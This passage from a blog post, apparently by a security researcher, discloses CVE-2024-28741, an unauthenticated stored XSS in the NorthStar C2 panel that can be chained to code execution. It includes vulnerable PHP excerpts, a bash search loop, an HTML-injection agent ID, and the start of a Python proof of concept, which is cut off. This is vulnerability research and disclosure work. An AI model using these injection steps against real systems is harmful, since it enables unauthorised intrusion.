<!doctype html>
<html lang="en-us">
  <head>
    <title>Remote code execution on NorthStar C2 agents via malicious agent registrations (CVE-2024-28741) // </title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.140.0">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="chebuya" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.a5031799cdaa4009a95a89643ef8be32c1d9e554e539288ba91b4fcfebcf8035.css" />

    
    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Remote code execution on NorthStar C2 agents via malicious agent registrations (CVE-2024-28741)">
  <meta name="twitter:description" content="PoC: https://github.com/chebuya/CVE-2024-28741-northstar-agent-rce-poc Your browser does not support the video tag. Introduction Northstar C2 is an open source, web based command and control framework most notably utilized by UNC38901, APT332, and Patchwork/APT-Q-363. I was able to discover a pre auth stored XSS that can be chained too remotely execute code on machines under the control of operators. This allows an attacker to load their own C2 agent and force terminate the Nortstar C2 agent, effectively âstealingâ the operatorâs access.">

    <meta property="og:url" content="https://blog.chebuya.com/posts/discovering-cve-2024-28741-remote-code-execution-on-northstar-c2-agents-via-pre-auth-stored-xss/">
  <meta property="og:title" content="Remote code execution on NorthStar C2 agents via malicious agent registrations (CVE-2024-28741)">
  <meta property="og:description" content="PoC: https://github.com/chebuya/CVE-2024-28741-northstar-agent-rce-poc Your browser does not support the video tag. Introduction Northstar C2 is an open source, web based command and control framework most notably utilized by UNC38901, APT332, and Patchwork/APT-Q-363. I was able to discover a pre auth stored XSS that can be chained too remotely execute code on machines under the control of operators. This allows an attacker to load their own C2 agent and force terminate the Nortstar C2 agent, effectively âstealingâ the operatorâs access.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-03-11T12:10:52-04:00">
    <meta property="article:modified_time" content="2024-03-11T12:10:52-04:00">


  </head>
  <body>
    <header class="app-header">
    <a href="https://blog.chebuya.com/"><img class="app-header-avatar" src="/avatar.jpg" alt="chebuya" /></a>

      <span class="app-header-title"></span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/about/">About</a>
      </nav>
      <p> </p>
      <div class="app-header-social">
        
          <a href="https://www.linkedin.com/in/chebuya-%E2%80%8E-5a0a08294/" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
  <title>LinkedIn</title>
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
</svg>
          </a>
        
          <a href="https://packetstormsecurity.com/files/author/17026/" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-spider">
  <title>Exploit-DB</title>
  <path d="M5 9C5 7.89543 5.89543 7 7 7H17C18.1046 7 19 7.89543 19 9V14C19 17.866 15.866 21 12 21V21C8.13401 21 5 17.866 5 14V9Z" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M8 6V5.57546C8 4.59379 8.38443 3.61462 9.32606 3.33713C10.8514 2.88762 13.1486 2.88762 14.6739 3.33713C15.6156 3.61462 16 4.59379 16 5.57546V6" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M18.5 7.5L22 4" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M5.5 7.5L2 4" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M6 18L2 21" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M5 12H1.5" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M22.5 12H19" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M18 18L22 21" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 13L12 21" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
</svg>
          </a>
        
          <a href="https://hackerone.com/chebuya?type=user" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-hackerone">
  <title>HackerOne</title>
  <path d="M7.207 0c-.4836 0-.8774.1018-1.1823.3002-.3044.2003-.4592.4627-.4592.7798v21.809c0 .2766.1581.5277.4752.7609.315.2335.7031.3501 1.1664.3501.4427 0 .8306-.1166 1.1678-.3501.3352-.231.5058-.4843.5058-.761V1.0815c0-.319-.1623-.5769-.4893-.7813C8.0644.1018 7.6702 0 7.207 0zm9.5234 8.662c-.4836 0-.8717.0981-1.1683.3007l-4.439 2.7822c-.1988.1861-.2841.4687-.2473.855.0342.3826.2108.747.5238 1.0907.3145.346.6662.5626 1.0684.6547.3963.0899.6973.041.8962-.143l1.7551-1.0951v9.7817c0 .2767.1522.5278.4607.761.3007.2335.6873.3501 1.1504.3501.463 0 .863-.1166 1.1983-.3501.3371-.2332.5058-.4843.5058-.761V9.7381c0-.3193-.165-.577-.4898-.7754-.3252-.2026-.7288-.3007-1.2143-.3007z"/>
</svg>
          </a>
        
          <a href="https://github.com/chebuya" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>GitHub</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://twitter.com/_chebuya" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
  <title>Twitter</title>
  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Remote code execution on NorthStar C2 agents via malicious agent registrations (CVE-2024-28741)</h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Mar 11, 2024
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          11 min read
        </div>
      </div>
    </header>
    <div class="post-content">
      <p>PoC: <a href="https://github.com/chebuya/CVE-2024-28741-northstar-agent-rce-poc">https://github.com/chebuya/CVE-2024-28741-northstar-agent-rce-poc</a><!-- raw HTML omitted -->

 

<video width=100% controls autoplay>
    <source src="/northstarc2-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.  
</video>


</p>
<h3 id="introduction">Introduction</h3>
<p>Northstar C2 is an <a href="https://github.com/EnginDemirbilek/NorthStarC2">open source</a>, web based command and control framework most notably utilized by UNC3890<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>, APT33<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>, and Patchwork/APT-Q-36<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>.  I was able to discover a pre auth stored XSS that can be chained too remotely execute code on machines under the control of operators.  This allows an attacker to load their own C2 agent and force terminate the Nortstar C2 agent, effectively &ldquo;stealing&rdquo; the operator&rsquo;s access.</p>
<p>I decided to go hunting for vulnerabilities in C2 frameworks after being inspired by @ACEResponder who found issues in both sliver<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup> and empire<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup> C2 frameworks.<!-- raw HTML omitted --></p>
<h3 id="finding-a-target">Finding a target</h3>
<p>A good place to find open source projects to target is github topics.  Github topics groups repositories with a similar subject area or focus, which is useful if you are trying to find a vulnerability in a particular type of application (in our case, C2 frameworks).  For example:</p>
<p><a href="https://github.com/topics/c2">https://github.com/topics/c2</a></p>
<p>Contains multiple open source command and control frameworks, as well as other C2 related tooling or references.  To expand your scope, you can look through similar or synonymous topics such as:</p>
<p><a href="https://github.com/topics/botnet">https://github.com/topics/botnet</a> <br>
<a href="https://github.com/topics/rat">https://github.com/topics/rat</a> <br>
<a href="https://github.com/topics/post-exploitation">https://github.com/topics/post-exploitation</a> <br>
<a href="https://github.com/topics/backdoor">https://github.com/topics/backdoor</a></p>
<p>I selected NorthStar C2 because it was developed in PHP and it had a smaller codebase compared to other frameworks which would make code review faster.<!-- raw HTML omitted --></p>
<h3 id="mapping-pre-authentication-attack-surface">Mapping pre authentication attack surface</h3>
<p>I started by mapping pre authentication attack surface.  NorthStar C2 implements authentication checks by including a session file at the beginning of each PHP file that requires authentication to access</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;session.php&#39;</span>;
</span></span><span style="display:flex;"><span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><!-- raw HTML omitted -->
<p>The session.php file will redirect you to login if you haven&rsquo;t logged in yet. <br>
session.php:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION))
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#34;username&#34;</span>])){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">session_destroy</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;location: /getin.php&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><!-- raw HTML omitted -->
<p>To find PHP files not requiring authentication, we can look for every PHP file that does not contain &ldquo;session.php&rdquo;.  To filter this list of files even further, we can look for files that also contain keywords indicative of potentially attacker-controlled input.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> f in <span style="color:#66d9ef">$(</span>find . -name <span style="color:#e6db74">&#34;*.php&#34;</span><span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ! grep -q session.php $f <span style="color:#f92672">&amp;&amp;</span> grep <span style="color:#e6db74">&#34;_GET\|_POST\|_REQUEST\|_SERVER&#34;</span> $f &gt; /dev/null; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>		echo $f
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><p>We are left with 6 files.</p>
<pre tabindex="0"><code>./chcksid.php
./functions/assignCommand.function.php
./getin.php
./ipAndUserAgent.php
./smanage.php
./update.php
</code></pre><h3 id="stored-xss-via-malicious-agent-registrations">Stored XSS via malicious agent registrations</h3>
<p>After reviewing the files, I was able to identify a route in which a portion of an unauthenticated request that would be persistently reflected on the admin web panel without sanitization, allowing for stored XSS.  Before diving into the exploitation details, we will need understand the NorthStar C2 stager registration flow.  The documentation reads<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup>:</p>
<pre tabindex="0"><code>The stager registration process consists of 2 phases;

First phase:

NorthStar Stager sends an unique id value to login.php with HTTP POST method. This value is XORed with a hard-coded key and is in base64 format.
The C2 Server decrypts this value and checks if the unique id starts with a &#34;N&#34;, ends with a &#34;q&#34; and is less than 20 characters.If everything checks out, the value is registered into the C2 database.
A second XOR key, which will be used for communications, is transferred from NorthStar C2 Server to NorthStar Stager.
NorthStar Stager receives and registers the XOR key.
</code></pre><p>These registration routes are accessible prior to authentication (which is required by the design of the application). According to the documentation, some checks will be done to determine a valid ID, but no mention of any more sanitation besides that.  Let&rsquo;s see how these checks are implemented in code. <br>
chcksid.php</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;conn.php&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;functions/chiper.function.php&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">//check if request is valid request
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;sid&#34;</span>]) <span style="color:#f92672">||</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;sid&#34;</span>])){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  $str;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;sid&#34;</span>])){
</span></span><span style="display:flex;"><span>      $str <span style="color:#f92672">=</span> <span style="color:#a6e22e">decrypt</span>($_POST[<span style="color:#e6db74">&#34;sid&#34;</span>], <span style="color:#e6db74">&#34;northstar&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>    $str <span style="color:#f92672">=</span> <span style="color:#a6e22e">decrypt</span>($_GET[<span style="color:#e6db74">&#34;sid&#34;</span>], <span style="color:#e6db74">&#34;northstar&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Check if sid is a valid client sid.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> ($str[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;N&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $str[<span style="color:#a6e22e">strlen</span>($str)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;q&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strlen</span>($str) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">20</span>) {
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">404</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;html&gt;&lt;title&gt;Not Found&lt;/title&gt;&lt;h1&gt;PAGE NOT FOUND&lt;/h1&gt;&lt;html&gt;&#34;</span>; 	
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//Use header function to send a 404
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">404</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;html&gt;&lt;title&gt;Not Found&lt;/title&gt;&lt;h1&gt;PAGE NOT FOUND&lt;/h1&gt;&lt;html&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//End the script
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The agent ID, saved to the variable <code>$str</code>, has no sanitization in place besides checking the first and last character of the ID, and the length check.  Any registration attempt containing an ID that does not fit this criteria will fail.  Let&rsquo;s trace the path of this parameter to it&rsquo;s sink.<!-- raw HTML omitted -->
The chcksid.php file is included in the stager registration file, login.php.  login.php will pass the <code>$str</code> variable (the agent id) into an updateLogs function.  Again, we can observe that there are no further sanitazation on the <code>$str</code> parameter <br>
login.php:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;conn.php&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;chcksid.php&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;functions/registerSession.function.php&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;functions/updateLogs.function.php&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;ipAndUserAgent.php&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$sessionXorKey <span style="color:#f92672">=</span> <span style="color:#a6e22e">register</span>($conn, $str, $ip);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">strpos</span>($sessionXorKey, <span style="color:#e6db74">&#39;error&#39;</span>))
</span></span><span style="display:flex;"><span>   {
</span></span><span style="display:flex;"><span>     $encKey <span style="color:#f92672">=</span>  <span style="color:#a6e22e">encrypt</span>($sessionXorKey, <span style="color:#e6db74">&#34;northstar&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $encKey;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">updateLogs</span>($conn, <span style="color:#e6db74">&#34;First stage&#34;</span>,<span style="color:#e6db74">&#34;First stage OK&#34;</span>, $agent,$str,$ip);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">updateLogs</span>($conn, <span style="color:#e6db74">&#34;Error&#34;</span>,<span style="color:#e6db74">&#34;Er: first stage&#34;</span>, $agent,$str,$ip);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><!-- raw HTML omitted -->
<p>We can see that an &ldquo;updateLogs&rdquo; function inserts the <code>$str</code> parameter (now <code>$logClient</code>) directly into the database.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">updateLogs</span>($conn, $logType, $logContent, $logUserAgent, $logClient, $logIP)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $updateLog <span style="color:#f92672">=</span> $conn<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#34;INSERT INTO logs(logDate, logClient, logType, logIP, logUserAgent, logContent) values(NOW(),?,?,?,?,?)&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($updateLog <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $errorControl <span style="color:#f92672">=</span> $updateLog<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bind_param</span>(<span style="color:#e6db74">&#34;sssss&#34;</span>, $logClient, $logType, $logIP, $logUserAgent, $logContent);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($errorControl <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            $errorControl <span style="color:#f92672">=</span> $updateLog<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">execute</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($errorControl <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;An error occured: &#34;</span> <span style="color:#f92672">.</span> $updateLog<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;An error occured: &#34;</span> <span style="color:#f92672">.</span> $updateLog<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;An error occured: &#34;</span> <span style="color:#f92672">.</span> $conn<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If these logs were displayed in the web interface, an attacker could send a malicious registration request containing a specially crafted ID that would be displayed to the operators without sanitization.  For example, the following agent ID</p>
<pre tabindex="0"><code>N&lt;hr&gt;q
</code></pre><p>Would be a valid agent ID because it starts with an N, ends with a q, and is less then 20 characters.  The <!-- raw HTML omitted --> tag will insert a visible line into a webpage that directly added agent IDs into the DOM.  I will demostrate how I was able to escalate this into stored XSS in a moment.<!-- raw HTML omitted --></p>
<p>To look for places in the application displaying logs, I ran the following bash command, which finds files querying the logs SQL table</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -Ri <span style="color:#e6db74">&#34;from logs&#34;</span>
</span></span></code></pre></div><p>I identified two files that queried the logs table, and on, logs.php was perfect for our purposes.  logs.php, as it&rsquo;s name suggests, displayed server and registration logs to the operators.  We can observe the agent ID (logClient) being echoed to the page without sanitization<!-- raw HTML omitted -->
logs.php:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  $num <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  $result <span style="color:#f92672">=</span> $conn<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;select logDate, logType, logClient, logContent, logIp from logs ORDER by id DESC&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($result<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">num_rows</span> <span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>($row <span style="color:#f92672">=</span> $result<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fetch_assoc</span>())
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;tr&gt;&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;td&gt;&#34;</span><span style="color:#f92672">.</span> $num <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/td&gt;&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;td&gt;&#34;</span> <span style="color:#f92672">.</span> $row[<span style="color:#e6db74">&#39;logDate&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/td&gt;&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;td&gt;&#34;</span><span style="color:#f92672">.</span>  $row[<span style="color:#e6db74">&#34;logType&#34;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/td&gt;&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;td&gt;&#34;</span> <span style="color:#f92672">.</span> $row[<span style="color:#e6db74">&#34;logClient&#34;</span>] <span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/td&gt;&#34;</span><span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;td&gt;&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($row[<span style="color:#e6db74">&#34;logContent&#34;</span>]) <span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/td&gt;&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;td&gt;&#34;</span> <span style="color:#f92672">.</span> $row[<span style="color:#e6db74">&#34;logIp&#34;</span>] <span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/td&gt;&#34;</span><span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;td&gt;&#34;</span>  <span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/td&gt;&#34;</span> <span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/tr&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>    $num<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>I was able to confirm HTML injection by spoofing the stager registration process with a &ldquo;malicious&rdquo; agent ID<!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor_encryption</span>(text, key):
